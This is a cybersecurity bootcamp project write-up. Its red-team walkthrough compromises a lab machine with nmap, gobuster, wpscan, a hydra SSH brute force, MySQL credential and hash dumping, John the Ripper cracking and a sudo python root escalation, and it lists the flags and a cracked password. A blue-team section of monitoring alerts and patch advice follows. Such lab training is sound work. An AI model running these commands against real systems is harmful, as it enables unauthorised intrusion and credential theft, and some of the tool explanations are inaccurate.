# Final_Project_CyberBootcamp

# Red Team: Summary of Operations

## Table of Contents
- Exposed Services
- Critical Vulnerabilities
- Exploitation

### Exposed Services
Use nmap to enumerate the target and find the exposed service.

Nmap scan results for each machine reveal the below services and OS details:

```bash
$ nmap -sV -sT -A 192.168.1.110
  
```
![](https://github.com/pboonman196/Final_Project_CyberBootcamp/blob/main/Screenshot/nmap_scan_result.png)

## Command Explain.

|    Options    |                                            Description                                            |
|:-------------:|:-------------------------------------------------------------------------------------------------:|
| -sV           | Version Detection - Enables version detection                                                     |
| -sT           | TCP Conncect Scan - TCP connect scan is the default TCP scan type when SYN scan is not an option. |
| -A            | Aggressive Scan Options - This option enables additional advanced and aggressive options.         |
| 192.168.1.110 | The IP address of the target machine.                                                             |

This scan identifies the services below as potential points of entry:
- Target 1
  - 22/TCP - SSH
  - 80/TCP - HTTP
  - 139/TCP - SMB
  - 445/TCP - SMB
  - 111/TCP - RPCBind

The following vulnerabilities were identified on target1 machine:

| Vulnerabilities | Critical rating | Port    | Version/Website Page             | Description                                                                                                                                                    |
|-----------------|-----------------|---------|----------------------------------|----------------------------------------------------------------------------------------------------------------------------------------------------------------|
| CVE-2015-5600   | 8.5             | 22/SSH  | OpenSSH 6.7p1 Debian             | Remote attacker can conduct brute-force  attacks or cause a denial of service                                                                                  |
| CVE-2021-44790  | 7.5             | 80/HTTP | Apache 2.4.10 Debian             | A carefully crafted body can cause a buffer overflow in the  mod_lua multipart parser.                                                                         |
| Service regsvc  | 5.0             | 139/SMB | netbios-ssn Samba smbd 3.x - 4.x | Service regsvc in Microsoft Windows 2000 systems is vulnerable to  denial of service caused by null deference.                                                 |
| DOM-based XSS   | 6.0             | 80/HTTP | http://192.168.1.110/contact.php | XSS discoverd by running burpsuite scan shown possibility of XSS,  an attacker can tamper with the HTML response body an send it as client-side request(CSRF). |

### Exploitation

The target1 has been discovered to be vulnerable to exploit in a variety of ways, and our research team, as a red team, has successfully penetrated the target1, as illustrated in the step below.

- Target 1
  - `flag1.txt`: flag1{9bbcb33e11b80be759c4e844862482} `flag1.txt` hash value_
    - **Exploit Used**
    - flag1 can easily discover using gobuster to discover the directories of the target1 sites. We used gobuster to done this job.
```bash
  $ gobuster dir -e -u http://192.168.1.110/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
```
![](https://github.com/pboonman196/Final_Project_CyberBootcamp/blob/main/Screenshot/gobuster_command.png)
## Command Explain

| Options | Description                                   |
|---------|-----------------------------------------------|
| dir     | Used for directory/file bruteforcing.         |
| -e      | Expanded mode, print full URLs.               |
| -u      | (-username [string]) Username for Basic Auth. |
| -w      | (-wordlist [wordlist]) Path to wordlist.      |

   - we are now able go by the directory uncovered by gobuster and we eventually found the flag1 by just inspecting the service.html page.


![](https://github.com/pboonman196/Final_Project_CyberBootcamp/blob/main/Screenshot/discovered_flag1.png)

Next we are going to uncover the flag2 in the following reproducing steps:

  - `flag2.txt`: flag2{fc3fd58dcdad9ab23faca6e9a36e581c}

To begin, we browse to the directory we discovered during the flag1 discovery phase. We also have insider knowledge that the flag2 are likely to be discovered in the /vendor directory, which we will verify shortly.

![](https://github.com/pboonman196/Final_Project_CyberBootcamp/blob/main/Screenshot/exposed_directories_path.png)

We can verify that there is the hint of the directory path we have to visit in the target1 machine. So we decided to enumerate the user of the target1.
 
  - Command used to enumerate user and check all vulnerable theme, outdated plugin on the wordpress site:
  
  ```bash
  $ wpscan --url http://192.168.1.110/wordpress --rua --enumerate u
  ```
  - After running this command, we are can see that this wordpress site username is exposed to the public.
![](https://github.com/pboonman196/Final_Project_CyberBootcamp/blob/main/Screenshot/wpscan_result.png)  

  - Since the target1 is vulnerable to ssh-bruteforcing, we can use hydra to run the password list against the username we found to login, in this case we will try with michael

```bash
  $ hydra -l michael -P /usr/share/wordlists/rockyou.txt 192.168.1.110 -t 4 ssh
```

## Command Explain

| Options | Description                                                                |
|---------|----------------------------------------------------------------------------|
| hydra   | A very fast network logon cracker which support many different services    |
| -l      | Login - or -L FILE login with LOGIN name, or load several logins from FILE |
| -p      | PASS - or -P FILE try password PASS, or load several passwords from FILE   |
| -t      | TASKS - run TASKS number of connects in parallel (default: 16)             |

![](https://github.com/pboonman196/Final_Project_CyberBootcamp/blob/main/Screenshot/hydra_bruteforce_ssh.png)
   
  - After we optained the credential, we can begin loging into the target using SSH.
```bash
  $ ssh michael@192.168.1.110
```
![](https://github.com/pboonman196/Final_Project_CyberBootcamp/blob/main/Screenshot/SSH_login.png)

Next, we are visitting the directory path from the information gained from the previous step and found the flag2 were in /var/www/flag2.txt

![](https://github.com/pboonman196/Final_Project_CyberBootcamp/blob/main/Screenshot/discovered_flag2.png)

     - `flag3.txt`: flag3{afc01ab56b50591e7dccf93122770cd2}

To get flag3, we go by visitting the wp-config to gain the credential of mySql database.

![](https://github.com/pboonman196/Final_Project_CyberBootcamp/blob/main/Screenshot/sql_credential_in_wp-config.png)

- Now we can access to mysql database using this command.

  ```bash
  mysql -h localhost -u root -p
  ```
## Command Explain 

| Options | Description                                                |
|---------|------------------------------------------------------------|
| mysql   | To get access to the mysql database                        |
| -h      | host name: Connect to the MySQL server on the given host.  |
| -u      | The MySQL user name to user when connecting to the server. |
| -p      | The password to use when connecting to the server.         |

- Next we use the sql query to uncover the flag3 location.
--> show databases; --> use wordpress --> show tables; --> describe wp_users; --> select post_content from wp_posts;

![](https://github.com/pboonman196/Final_Project_CyberBootcamp/blob/main/Screenshot/using_of_sql_query.png)

![](https://github.com/pboonman196/Final_Project_CyberBootcamp/blob/main/Screenshot/discover_flag_3.png)

  - `flag4.txt`: flag4{715dea6c055b9fe3337544932f2941ce}

To get start with the flag4, we continue to search through the SQL database to find the user password hashes. We use the following query to identify the hashes.

--> describe wp_users; --> select user_login, user_pass from wp_users; 

![](https://github.com/pboonman196/Final_Project_CyberBootcamp/blob/main/Screenshot/discover_user_hash.png)

- Next, we use the query to join the user and hash together.

--> select concat_ws(':', user_login, user_pass) from wp_users:

![](https://github.com/pboonman196/Final_Project_CyberBootcamp/blob/main/Screenshot/join_two_user_and_hashes.png)

- Now we export the user hashed into a file using this query.

--> select concat_ws(':', user_login, user_pass) from wp_users into outfile '/var/www/html/user_hash.txt

![](https://github.com/pboonman196/Final_Project_CyberBootcamp/blob/main/Screenshot/hashes_export_to_michael.png)

- Before we begin to crack the hashes, we have to download the file to the host machine using the command:

```bash
scp michael@192.168.1.110:/var/www/html/user_hash.txt
```
***scp command is a secure copy (remote file copy) and can be done either from the host or fromt the remote machine, in the step above we have done using it from the host machine.***

![](https://github.com/pboonman196/Final_Project_CyberBootcamp/blob/main/Screenshot/scp_from_michael_to_localhost.png)

- Now we are ready to begin cracking the hashes using John the Ripper.

***John the Ripper is a free password cracking software tool.

```bash
$ john --wordlist=/usr/share/wordlists/rockyou.txt user_hash.txt
```
![](https://github.com/pboonman196/Final_Project_CyberBootcamp/blob/main/Screenshot/using_john_to_crack.png)

- Now we can crack the hashes of user steven, that has been identified as "pink84."

- Next, we ssh into steven using that password we cracked earlier.

![](https://github.com/pboonman196/Final_Project_CyberBootcamp/blob/main/Screenshot/ssh_to_steven.png)

- We gained access to Steven's workstation successfully, however it appears that Steven did not have root privileges.

- Next we using this command to elevate the root priviledge.

```bash
sudo /usr/bin/python; import os; os.system('/bin/bash')
```
![](https://github.com/pboonman196/Final_Project_CyberBootcamp/blob/main/Screenshot/steven_priv_escalation.png)

- Next, the flag4 can be easily discover under the root directory.

![](https://github.com/pboonman196/Final_Project_CyberBootcamp/blob/main/Screenshot/flag4.png)

So now we are successfully exploited the target1 machine!

# End of Summary

---

# Blue Team: Summary of Operations

## Table of Contents
- Network Topology
- Description of Targets
- Monitoring the Targets
- Patterns of Traffic & Behavior
- Suggestions for Going Further

### Network Topology
![](https://github.com/pboonman196/Final_Project_CyberBootcamp/blob/main/Screenshot_defensive_template/Picture1.png)

The following machines were identified on the network:

- Network:
  - Adress Range: 192.168.1.0/24
  - Netmask: 255.255.255.0
  - Gateway: 10.0.0.1
- Target1
  - **Operating System**: Linux
  - **Purpose**: Vulnerable machine
  - **IP Address**: 192.168.1.110
- Target2
  - **Operating System**: Linux
  - **Purpose**: Vulnerable machine
  - **IP Address**: 192.168.1.115
- ELK
  - **Operating System**: Linux
  - **Purpose**: Monitoring machine(Kibana)
  - **IP Address**: 192.168.1.100
- Capstone
  - **Operating System**: Linux
  - **Purpose**: Filebeat and Metricbeat are installed and will forward logs to the ELK machine.
  - **IP Address**: 192.168.1.105

### Description of Targets

The target of this attack was: `Target 1` (192.168.1.110).

Target 1 is an Apache web server and has SSH enabled, so ports 80 and 22 are possible ports of entry for attackers. As such, the following alerts have been implemented:

### Monitoring the Targets

Traffic to these services should be carefully monitored. To this end, we have implemented the alerts below:

#### Excessive HTTP Errors

Excessive HTTP Errors is implemented as follows:
  - **Metric**: 
      - WHEN count() GROUPED OVER top 5 'http.response.status_code' 
  - **Threshold**: 
      - IS ABOVE 400
  - **Vulnerability Mitigated**: 
      - Enumerating/Brute-Forcing
  - **Reliability**: 
      - The alert is very accurate. If you measure by error codes 400 and above, you won't be able to see any normal or effective responses. More than 400 of the         codes           are client - server errors, which are more important to keep an eye on. Even when you take into account that these error codes are going off at a high rate.

![](https://github.com/pboonman196/Final_Project_CyberBootcamp/blob/main/Screenshot_defensive_template/excessive_http_errors_alert.png)

#### HTTP Request Size Monitor

HTTP Request Size Monitor is implemented as follows:
  - **Metric**: 
      - WHEN sum() of http.request.bytes OVER all documents 
  - **Threshold**: 
      - IS ABOVE 3500 FOR THE LAST 1 minute   
  - **Vulnerability Mitigated**: 
      - Command injection, Cross-site scripting(XSS), Denial of Servive(DDoS)  
  - **Reliability**: 
      - Some alerts might be false positives. It has a decent level of reliability. An HTTP request that isn't malicious or has a lot of traffic that isn't malicious could be           very big. 

![](https://github.com/pboonman196/Final_Project_CyberBootcamp/blob/main/Screenshot_defensive_template/http_request_size_monitor_alert.png)

#### CPU Usage Monitor
CPU Usage Monitor is implemented as follows:
  - **Metric**: 
      - WHEN max() OF system.process.cpu.total.pct OVER all documents
  - **Threshold**: 
      - IS ABOVE 0.5 FOR THE LAST 5 minutes
  - **Vulnerability Mitigated**: 
      - Malicious service, unintended software such as malware, those are running in the background and consuming the CPU resources.    
  - **Reliability**: 
      - The alert is quite reliable. Even if there isn't a malicious software running, this may aid in determining where CPU utilization might be improved.

![](https://github.com/pboonman196/Final_Project_CyberBootcamp/blob/main/Screenshot_defensive_template/cpu_usage_monitor_alert.png)

The logs and alerts generated during the assessment suggest that this network is susceptible to several active threats, identified by the alerts above. In addition to watching for occurrences of such threats, the network should be hardened against them. The Blue Team suggests that IT implement the fixes below to protect the network:
- Vulnerability 1: ssh login
  - **Patch**: 
     - Disable the sshd service.
  - **Why It Works**: 
     - This will prevent the non-root user from being accessed to ssh.
- Vulnerability 2: Wordpress vulnerable site
  - **Patch**: 
     - Keep an up-to-date with the wordpress version.
     - Unactive the old plugin that it may have known vulnerable to the public exploit.
     - Keep PHP version up-to-date.
  - **Why It Works**: 
     - This is an excellent security practice since keeping up to date will patch any known vulnerabilities that may be discovered by pen-testers or black-hat hackers.
- Vulnerability 3: Code Injection/Cross-site Scripting(XSS)
  - **Patch**: 
     - Fileter an input on arrival. At the point where user input is received, filter as strictly as possible based on what is expected or valid input.
     - Encode data on output. At the point where user-controllable data is output in HTTP responses, encode the output to prevent it from being interpreted as active content. D        epending on the output context, this might require applying combinations of HTML, URL, JavaScript, and CSS encoding
     - Use appropriate response headers. To prevent XSS in HTTP responses that aren't intended to contain any HTML or JavaScript, you can use the Content-Type and X-Content-            Type-Options headers to ensure that browsers interpret the responses in the way you intend.
     - Content Security Policy. As a last line of defense, you can use Content Security Policy (CSP) to reduce the severity of any XSS vulnerabilities that still occur. 
     ***[Source](https://portswigger.net/web-security/cross-site-scripting)*** 
  - **Why It Works**: This will sanitize any input and prevent the code to be tampered with.

# End of Summanry
